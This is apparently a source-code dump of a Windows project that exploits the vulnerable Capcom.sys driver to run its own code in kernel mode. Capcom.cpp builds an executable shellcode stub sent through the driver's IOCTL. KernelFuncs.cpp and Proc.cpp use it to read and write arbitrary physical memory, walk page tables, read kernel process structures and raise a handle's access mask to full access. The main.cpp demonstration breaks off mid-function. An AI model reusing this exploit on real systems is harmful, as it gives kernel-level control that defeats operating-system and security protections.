Project Path: arc_gmh5225_CapcomDKOM_qk9aeobm

Source Tree:

```txt
arc_gmh5225_CapcomDKOM_qk9aeobm
├── CapcomDKOM
│   ├── Capcom.cpp
│   ├── Capcom.h
│   ├── CapcomPhysical.vcxproj
│   ├── CapcomPhysical.vcxproj.filters
│   ├── Driver
│   │   └── Capcom.sys
│   ├── Global.h
│   ├── KernelFuncs.cpp
│   ├── KernelFuncs.h
│   ├── Proc.cpp
│   ├── Proc.h
│   └── main.cpp
└── README.md

```

`CapcomDKOM/Capcom.cpp`:

```cpp
#include "Global.h"

CapcomIoctl* g_pCapcomIoctl = new CapcomIoctl();

void CapcomIoctl::Build(fnCapcomRunFunc UserFunction, PVOID UserData)
{
	CapcomCodePayload* CodePayload = (CapcomCodePayload*)VirtualAlloc(nullptr, sizeof(CapcomCodePayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	BYTE CodePayloadTemp[] =
	{
		0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 ; Skip 8 bytes, this puts the UserFunction into RAX
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // UserFunction address will be here
		0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, CustomData
		0x58,                                                       // POP RAX
		0xFF, 0x20                                                  // JMP [RAX]
	};

	*(ULONGLONG*)(CodePayloadTemp + 0x5) = (ULONGLONG)UserFunction;
	*(ULONGLONG*)(CodePayloadTemp + 0xF) = (ULONGLONG)UserData;

	CodePayload->PointerToPayload = CodePayload->Payload;
	this->PointerToPayload = CodePayload->Payload;

	ZeroMemory(CodePayload->Payload, PAYLOAD_BUFFER_SIZE);
	CopyMemory(CodePayload->Payload, CodePayloadTemp, sizeof(CodePayloadTemp));

}

void CapcomIoctl::Free()
{
	VirtualFree(PointerToPayload, 0, MEM_RELEASE);
}

void CapcomIoctl::Run(HANDLE CapcomDevice)
{
	DWORD OutputBuffer;
	DWORD BytesReturned;

	DeviceIoControl(CapcomDevice, IOCTL_X64, &PointerToPayload, 8, &OutputBuffer, 4, &BytesReturned, nullptr);
}
```

`CapcomDKOM/Capcom.h`:

```h
#pragma once


#define IOCTL_X86           0xAA012044
#define IOCTL_X64           0xAA013044
#define PAYLOAD_BUFFER_SIZE 0x200

using fnMmGetSystemRoutineAddress = PVOID(NTAPI*)(PUNICODE_STRING);
using fnCapcomRunFunc = VOID(NTAPI*)(fnMmGetSystemRoutineAddress, PVOID);

struct CapcomCodePayload
{
	BYTE* PointerToPayload;                 // This points to the Payload member below
	BYTE  Payload[PAYLOAD_BUFFER_SIZE];     // Payload that is going to be executed
};

class CapcomIoctl
{
public:
	/// Arguments:
	///     - UserFunction: The function that will be executed
	///     - CustomData:   Pointer to custom data that will be sent to the function
	void Build(fnCapcomRunFunc UserFunction, PVOID UserData);

	void Free();

	/// Arguments:
	///     - CapcomDevice: Handle to the Capcom device
	void Run(HANDLE CapcomDevice);

private:
	BYTE* PointerToPayload;  //This must point to CapcomCodePayload::Payload
};

extern CapcomIoctl* g_pCapcomIoctl;
```

`CapcomDKOM/CapcomPhysical.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{3EDD48A8-B144-4953-BD42-4E1E588832A8}</ProjectGuid>
    <RootNamespace>CapcomPhysical</RootNamespace>
    <WindowsTargetPlatformVersion>8.1</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="Capcom.h" />
    <ClInclude Include="Global.h" />
    <ClInclude Include="KernelFuncs.h" />
    <ClInclude Include="Proc.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Capcom.cpp" />
    <ClCompile Include="KernelFuncs.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="Proc.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`CapcomDKOM/CapcomPhysical.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Capcom.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KernelFuncs.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Proc.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Capcom.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="KernelFuncs.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Proc.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Global.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`CapcomDKOM/Global.h`:

```h
#pragma once
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>

#include "Capcom.h"
#include "KernelFuncs.h"
#include "Proc.h"

#define IOCTL_READ		1
#define IOCTL_DIRTABLE	2
#define IOCTL_CR3		3
#define IOCTL_PPEB		4
#define IOCTL_HANDLE	5
#define IOCTL_WRITE		6


#pragma comment(lib, "ntdll.lib")

typedef struct _HANDLE_TABLE_ENTRY
{
	union
	{
		PVOID Object;
		ULONG ObAttributes;
		ULONG_PTR Value;
	};
	union
	{
		ACCESS_MASK GrantedAccess;
		LONG NextFreeTableEntry;
	};
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

typedef enum _MEMORY_CACHING_TYPE {
	MmNonCached = 0,
	MmCached = 1,
	MmWriteCombined = 2,
	MmHardwareCoherentCached = 3,
	MmNonCachedUnordered = 4,
	MmUSWCCached = 5,
	MmMaximumCacheType = 6
} MEMORY_CACHING_TYPE;

typedef struct _READWRITE_REQ
{
	DWORD IOCTL;
	uint64_t Address;
	SIZE_T Length;
	uint64_t Buffer;
	bool Success;
}READWRITE_REQ, *PREADWRITE_REQ;

typedef struct _REQUEST
{
	DWORD IOCTL;
	HANDLE ProcessId;
	uint64_t Ret;
}REQUEST, *PREQUEST;

typedef struct _HANDLE_REQ
{
	DWORD IOCTL;
	HANDLE ProcessId;
	HANDLE Handle;
	ACCESS_MASK Access;
	bool Success;
}HANDLE_REQ, *PHANDLE_REQ;
```

`CapcomDKOM/KernelFuncs.cpp`:

```cpp
#include "Global.h"

KernelFuncs* g_pKernelFuncs = new KernelFuncs();

// Get system routines from ntoskrnl.exe
PVOID GetSystemRoutine(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress, const wchar_t* RoutineName)
{
	UNICODE_STRING usRoutine;
	RtlInitUnicodeString(&usRoutine, RoutineName);
	return MmGetSystemRoutineAddress(&usRoutine);
}

// Initialize used routines
void KernelFuncs::GetSystemRoutines(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress)
{
	PsLookupProcessByProcessId
		= (decltype(PsLookupProcessByProcessId))GetSystemRoutine(MmGetSystemRoutineAddress, L"PsLookupProcessByProcessId");
	ObDereferenceObject
		= (decltype(ObDereferenceObject))GetSystemRoutine(MmGetSystemRoutineAddress, L"ObDereferenceObject");
	DbgPrintEx
		= (decltype(DbgPrintEx))GetSystemRoutine(MmGetSystemRoutineAddress, L"DbgPrintEx");
	MmMapIoSpace
		= (decltype(MmMapIoSpace))GetSystemRoutine(MmGetSystemRoutineAddress, L"MmMapIoSpace");
	MmUnmapIoSpace
		= (decltype(MmUnmapIoSpace))GetSystemRoutine(MmGetSystemRoutineAddress, L"MmUnmapIoSpace");

	m_InitializationFinished = TRUE;
}

// Function from ntoskrnl.exe which is not exported.
// Retrieves the handle_table_entry of inputted handle.
// Taken from IDA.
PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntry(PVOID pHandleTable, uint64_t Handle)
{
	uint64_t v2;
	int64_t v3;
	uint64_t result;
	uint64_t v5;

	uint64_t a1 = (uint64_t)pHandleTable;

	v2 = Handle & 0xFFFFFFFFFFFFFFFCui64;
	if (v2 >= *(uint32_t*)a1) 
	{
		result = 0i64;
	}
	else 
	{
		v3 = *(uint64_t*)(a1 + 8);
		if (*(uint64_t*)(a1 + 8) & 3) 
		{
			if ((*(uint32_t*)(a1 + 8) & 3) == 1) 
			{
				v5 = *(uint64_t*)(v3 + 8 * (v2 >> 10) - 1);
				result = v5 + 4 * (v2 & 0x3FF);
			}
			else 
			{
				v5 = *(uint64_t*)(*(uint64_t*)(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
				result = v5 + 4 * (v2 & 0x3FF);
			}
		}
		else 
		{
			result = v3 + 4 * v2;
		}
	}
	return (PHANDLE_TABLE_ENTRY)result;
}

// Function called by Capcom driver.
void __stdcall ExploitFunc(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress, PVOID CustomData)
{
	NTSTATUS            Status = 0;
	PEPROCESS           Process = NULL;

	if (!g_pKernelFuncs->m_InitializationFinished) {
		g_pKernelFuncs->GetSystemRoutines(MmGetSystemRoutineAddress);
	}
	
	__try
	{
		if (*(DWORD*)CustomData == IOCTL_READ || *(DWORD*)CustomData == IOCTL_WRITE)	// Read or Write physical memory
		{
			PREADWRITE_REQ Data = (PREADWRITE_REQ)CustomData;
			LARGE_INTEGER PhysAddress;
			PhysAddress.QuadPart = Data->Address;
			size_t v12 = Data->Length;
			uint64_t v13 = Data->Buffer;
			
			if (!v12 || !v13 || !PhysAddress.QuadPart)
			{
				Data->Success = false;
				return;
			}
			
			PVOID v17 = g_pKernelFuncs->MmMapIoSpace(PhysAddress, v12, MEMORY_CACHING_TYPE::MmNonCached);	// Map the physical address to a virtual address
			if (!v17)
			{
				Data->Success = false;
				return;
			}
			
			uint32_t v18 = 0;
			while (v18 < v12)
			{
				if (*(DWORD*)CustomData == IOCTL_READ)
					*(BYTE*)(v18 + v13) = *((BYTE*)v17 + v18);			// Copy bytes from
				else /*(*(DWORD*)CustomData == IOCTL_WRITE)*/
					*((BYTE*)v17 + v18) = *(BYTE*)(v18 + v13);			// Copy bytes to

				++v18;
			}
			g_pKernelFuncs->MmUnmapIoSpace(v17, v12);	// Unmap virtual address
			Data->Success = true;
		}
		if (*(DWORD*)CustomData == IOCTL_DIRTABLE)		// Retrieve DirectoryTableBase for memory translation
		{
			PREQUEST Data = (PREQUEST)CustomData;
			Status = g_pKernelFuncs->PsLookupProcessByProcessId(Data->ProcessId, &Process);
			if (NT_SUCCESS(Status))
			{
				Data->Ret = *(uint64_t*)((uint64_t)Process + 0x28);		// Get DirectoryTableBase from EPROCESS struct
			}
		}
		if (*(DWORD*)CustomData == IOCTL_CR3)
		{
			PREQUEST Data = (PREQUEST)CustomData;
			Data->Ret = __readcr3();			// Read control register 3
		}
		if (*(DWORD*)CustomData == IOCTL_PPEB)
		{
			PREQUEST Data = (PREQUEST)CustomData;
			Status = g_pKernelFuncs->PsLookupProcessByProcessId(Data->ProcessId, &Process);
			if (NT_SUCCESS(Status))
			{
				Data->Ret = *(uint64_t*)((uint64_t)Process + 0x3f8);	// Get pointer to PEB from EPROCESS struct
			}
		}
		if (*(DWORD*)CustomData == IOCTL_HANDLE)		// Change handle access mask
		{
			PHANDLE_REQ Data = (PHANDLE_REQ)CustomData;
			Status = g_pKernelFuncs->PsLookupProcessByProcessId(Data->ProcessId, &Process);
			if (!NT_SUCCESS(Status))
			{
				if (Process != NULL)
					g_pKernelFuncs->ObDereferenceObject(Process);
				Data->Success = false;
				return;
			}

			uint64_t pObjectTable = *(uint64_t*)((uint64_t)Process + 0x418);		// Get PHANDLE_TABLE from EPROCESS struct
			if (!pObjectTable)
			{
				if (Process != NULL)
					g_pKernelFuncs->ObDereferenceObject(Process);
				Data->Success = false;
				return;
			}

			PHANDLE_TABLE_ENTRY entry = ExpLookupHandleTableEntry((PVOID)pObjectTable, (uint64_t)Data->Handle);	// Look up the HANDLE_ENTRY
			if (!entry)
			{
				if (Process != NULL)
					g_pKernelFuncs->ObDereferenceObject(Process);
				Data->Success = false;
				return;
			}
			entry->GrantedAccess = Data->Access;		// Change its access mask
			Data->Success = true;
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	if (Process != NULL)
		g_pKernelFuncs->ObDereferenceObject(Process);
}

```

`CapcomDKOM/KernelFuncs.h`:

```h
#pragma once

typedef struct _DllRet DllRet;
typedef struct _REQUEST REQUEST;
typedef enum   _MEMORY_CACHING_TYPE MEMORY_CACHING_TYPE;

typedef struct  _EPROCESS *PEPROCESS;

void __stdcall ExploitFunc(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress, PVOID CustomData);

class KernelFuncs
{
public:
	

public:
	NTSTATUS(NTAPI* PsLookupProcessByProcessId)(HANDLE, PEPROCESS*);
	VOID(NTAPI* ObDereferenceObject)(PVOID);	
	ULONG(NTAPI* DbgPrintEx)(ULONG, ULONG, PCSTR, ...);
	PVOID(NTAPI* MmMapIoSpace)(LARGE_INTEGER, SIZE_T, MEMORY_CACHING_TYPE);
	VOID(NTAPI* MmUnmapIoSpace)(PVOID, SIZE_T);

	void GetSystemRoutines(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress);

	BOOLEAN m_InitializationFinished = FALSE;
};

extern KernelFuncs* g_pKernelFuncs;
```

`CapcomDKOM/Proc.cpp`:

```cpp
#include "Global.h"

Proc* g_pMem = new Proc();

bool Proc::OnSetup(const char* ProcessName)
{
	hDeviceDriver = CreateFile("\\\\.\\Htsysm72FB", FILE_ALL_ACCESS, FILE_SHARE_READ, nullptr, FILE_OPEN, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDeviceDriver == INVALID_HANDLE_VALUE)
		goto exit;

	ProcessId = GetProcessIdByName(ProcessName);
	if (!ProcessId)
		goto exit;

	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessId);	// For querying the WOW64 information
	if (hProc == INVALID_HANDLE_VALUE)	
		goto exit;

	if (!IsWow64Process(hProc, &IsProcess32bit))	// Check if the desired process is running in WOW64 environment
		goto exit;
	
	DirectoryTableBase = GetDirectoryTableBase();	
	if (!DirectoryTableBase)
		goto exit;

	pPEB = ReadPEBPointer();	
	if (!pPEB)
		goto exit;
	pPEB += IsProcess32bit ? 0x1000 : 0;	// If the process is 32bit, then the PEB32 is 0x1000 from the PEB64.
	

	CloseHandle(hProc);		// We only want this handle to query process info. Close it.
	return true;

exit:
	Detach();
	return false;
}

// Detach from process
void Proc::Detach()
{
	if (hDeviceDriver != INVALID_HANDLE_VALUE)
		CloseHandle(hDeviceDriver);
	if (hProc != INVALID_HANDLE_VALUE)
		CloseHandle(hProc);

	DirectoryTableBase = 0;
	pPEB = 0;
}

// Get module base and size from PEB.
module* Proc::GetModuleByName(const wchar_t* ModuleName)
{
	wchar_t* lel = new wchar_t[MAX_PATH];
	if (IsProcess32bit)
	{
		DWORD pebldr = Read<DWORD>(pPEB + 0xC);	// Read PEB_LDR_DATA*
		if (pebldr)
		{
			DWORD first = Read<DWORD>(pebldr + 0x14);	// Read first entry, (flink)
			if (first)
			{
				DWORD end = first;
				do
				{
					ZeroMemory(lel, MAX_PATH);
					DWORD dllSize = Read<DWORD>(first + 0x18);
					DWORD dllBase = Read<DWORD>(first + 0x10);

					if (!dllBase)
						return 0;

					DWORD dllbuffer = Read<DWORD>(first + 0x28);
					WORD dlllen = Read<WORD>(first + 0x24);

					Read(dllbuffer, (PVOID)lel, (size_t)dlllen);

					if (!wcscmp(lel, ModuleName))
					{
						module* mod = new module(dllBase, dllSize);
						return mod;
					}

					first = Read<DWORD>(first);
				} while (first != end);		// Walk the entirety of the modules until we are back to the start
			}
		}
	}
	else
	{
		PPEB peb = (PPEB)pPEB;
		
		PPEB_LDR_DATA pebldr = Read<PPEB_LDR_DATA>(&peb->Ldr);	// Read PEB_LDR_DATA*

		PLDR_DATA_TABLE_ENTRY first = Read<PLDR_DATA_TABLE_ENTRY>(&pebldr->InMemoryOrderModuleList);	// Read first entry, (flink)
		PLDR_DATA_TABLE_ENTRY end = first;
		do
		{
			wchar_t* lel = new wchar_t[MAX_PATH];
			ZeroMemory(lel, MAX_PATH);

			uint64_t dllSize = Read<uint64_t>((UINT64)first + 0x30);
			uint64_t dllBase = Read<uint64_t>((UINT64)first + 0x20);
			
			if (!dllBase)
				break;

			uint64_t dllbuffer = Read<uint64_t>((UINT64)first + 0x48 + 8);
			WORD dlllen = Read<WORD>((UINT64)first + 0x48);

			Read(dllbuffer, (PVOID)lel, (size_t)dlllen);
			

			first = Read<PLDR_DATA_TABLE_ENTRY>(first);
		} while (first != end);
	}
	return 0;
}

// Get process ID using snapshot.
uint32_t Proc::GetProcessIdByName(const char* ProcessName)
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hSnap, &pEntry))
	{
		do
		{
			if (!strcmp(pEntry.szExeFile, ProcessName))
			{
				CloseHandle(hSnap);
				return pEntry.th32ProcessID;
			}
		} while (Process32Next(hSnap, &pEntry));
	}
	CloseHandle(hSnap);
	return 0;
}

uint64_t Proc::ReadPEBPointer()
{
	if (!ProcessId)
		return 0;

	REQUEST Data{ 0 };
	Data.IOCTL = IOCTL_PPEB;
	Data.ProcessId = (HANDLE)ProcessId;

	g_pCapcomIoctl->Build(ExploitFunc, &Data);
	g_pCapcomIoctl->Run(hDeviceDriver);
	g_pCapcomIoctl->Free();

	return Data.Ret;
}

uint64_t Proc::GetDirectoryTableBase()
{
	if (!ProcessId)
		return 0;

	REQUEST Data{ 0 };
	Data.IOCTL = IOCTL_DIRTABLE;
	Data.ProcessId = (HANDLE)ProcessId;

	g_pCapcomIoctl->Build(ExploitFunc, &Data);
	g_pCapcomIoctl->Run(hDeviceDriver);
	g_pCapcomIoctl->Free();

	return Data.Ret;
}

uint64_t Proc::Read_cr3()
{
	REQUEST Data{ 0 };
	Data.IOCTL = IOCTL_CR3;

	g_pCapcomIoctl->Build(ExploitFunc, &Data);
	g_pCapcomIoctl->Run(hDeviceDriver);
	g_pCapcomIoctl->Free();

	return Data.Ret;
}

// Thanks MarkHC for this function <3.
// Too lazy to write my own xD
uint64_t Proc::TranslateVirtualAddress(PVOID VirtualAddress)
{
	if (!DirectoryTableBase)
		return 0;

	auto va = (std::uint64_t)VirtualAddress;

	auto PML4 = (USHORT)((va >> 39) & 0x1FF);
	auto DirectoryPtr = (USHORT)((va >> 30) & 0x1FF); 
	auto Directory = (USHORT)((va >> 21) & 0x1FF); 
	auto Table = (USHORT)((va >> 12) & 0x1FF); 

	auto PML4E = ReadPhysicalAddress<std::uint64_t>(DirectoryTableBase + PML4 * sizeof(ULONGLONG));

	if (PML4E == 0)
		return 0;

	auto PDPTE = ReadPhysicalAddress<std::uint64_t>((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(ULONGLONG));

	if (PDPTE == 0)
		return 0;

	if ((PDPTE & (1 << 7)) != 0) {
		return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
	}

	auto PDE = ReadPhysicalAddress<std::uint64_t>((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(ULONGLONG));

	if (PDE == 0)
		return 0;

	if ((PDE & (1 << 7)) != 0) {
		return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
	}

	auto PTE = ReadPhysicalAddress<std::uint64_t>((PDE & 0xFFFFFFFFFF000) + Table * sizeof(ULONGLONG));

	if (PTE == 0)
		return 0;

	return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
}

bool Proc::ReadPhysicalAddress(uint64_t address, PVOID buffer, size_t length)
{
	if (!address || !buffer || !length)
		return false;

	READWRITE_REQ Data{ 0 };

	Data.IOCTL = IOCTL_READ;
	Data.Address = address;
	Data.Length = length;
	Data.Buffer = (uint64_t)buffer;
	
	g_pCapcomIoctl->Build(ExploitFunc, &Data);
	g_pCapcomIoctl->Run(hDeviceDriver);
	g_pCapcomIoctl->Free();

	return Data.Success;
}

bool Proc::Read(uint64_t address, PVOID buffer, size_t length)
{
	uint64_t PhysicalAddress = TranslateVirtualAddress((PVOID)address);
	return ReadPhysicalAddress(PhysicalAddress, buffer, length);
}

bool Proc::ChangeHandleAccess(HANDLE handle, ACCESS_MASK Access)
{
	HANDLE_REQ Req;
	Req.IOCTL = IOCTL_HANDLE;
	Req.Access = Access;
	Req.Handle = handle;
	Req.ProcessId = (HANDLE)ProcessId;

	g_pCapcomIoctl->Build(ExploitFunc, &Req);
	g_pCapcomIoctl->Run(g_pMem->hDeviceDriver);
	g_pCapcomIoctl->Free();

	return Req.Success;
}

bool Proc::WritePhysicalAddress(uint64_t address, PVOID buffer, size_t length)
{
	if (!address || !buffer || !length)
		return false;
	
	READWRITE_REQ Data{ 0 };

	Data.IOCTL = IOCTL_WRITE;
	Data.Address = address;
	Data.Length = length;
	Data.Buffer = (uint64_t)buffer;

	g_pCapcomIoctl->Build(ExploitFunc, &Data);
	g_pCapcomIoctl->Run(hDeviceDriver);
	g_pCapcomIoctl->Free();

	return Data.Success;
}

bool Proc::Write(uint64_t address, PVOID buffer, size_t length)
{	
	uint64_t PhysicalAddress = TranslateVirtualAddress((PVOID)address);
	return WritePhysicalAddress(PhysicalAddress, buffer, length);
}

```

`CapcomDKOM/Proc.h`:

```h
#pragma once

// Module class base.
class module
{
public:
	const uint64_t dwBase, dwSize;

public:
	module(uint64_t base, uint64_t size)
		: dwBase(base),
		dwSize(size)
	{
	}

};


class Proc
{
public:
	bool OnSetup(const char* ProcessName);
	void Detach();
	uint32_t GetProcessIdByName(const char* ProcessName);
	module* GetModuleByName(const wchar_t* ModuleName);

	bool ChangeHandleAccess(HANDLE handle, ACCESS_MASK Access);

	bool ReadPhysicalAddress(uint64_t address, PVOID buffer, size_t length);
	template<typename T, typename U>
	T ReadPhysicalAddress(U address)
	{
		T buffer{ 0 };
		ReadPhysicalAddress(address, &buffer, sizeof(T));
		return buffer;
	}

	bool Read(uint64_t address, PVOID buffer, size_t length);
	template<typename T, typename U>
	T Read(U address)
	{
		T buffer{ 0 };
		Read((uint64_t)address, &buffer, sizeof(T));
		return buffer;
	}
	
	bool WritePhysicalAddress(uint64_t address, PVOID buffer, size_t length);
	template<typename T, typename U>
	bool WritePhysicalAddress(U address, T val)
	{
		return WritePhysicalAddress(address, &val, sizeof(T));
	}

	bool Write(uint64_t address, PVOID buffer, size_t length);
	template<typename T, typename U>
	bool Write(U address, T val)
	{
		return Write((uint64_t)address, &val, sizeof(T));
	}

private:
	uint64_t GetDirectoryTableBase();
	uint64_t Read_cr3();
	uint64_t ReadPEBPointer();
	
	uint64_t TranslateVirtualAddress(PVOID VirtualAddress);

	HANDLE hProc = INVALID_HANDLE_VALUE;
	BOOL IsProcess32bit;
	uint64_t DirectoryTableBase = 0;
	HANDLE hDeviceDriver = INVALID_HANDLE_VALUE;
	uint32_t ProcessId = -1;
	uint64_t pPEB = 0;
};

extern Proc* g_pMem;

```

`CapcomDKOM/main.cpp`:

```cpp
#include "Global.h"

int michi = 1234;
int jafar = 0;

int main()
{
	if (g_pMem->OnSetup("CapcomPhysical.exe"))	// Attach to process
	{
		std::cout << g_pMem->Read<int>(&michi) << '\n';
		HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, g_pMem->GetProcessIdByName("CapcomPhysical.exe"));
		g_pMem->ChangeHandleAccess(h, PROCESS_ALL_ACCESS);

		ReadProcessMemory(h, &michi, &jafar, sizeof(int), 0);
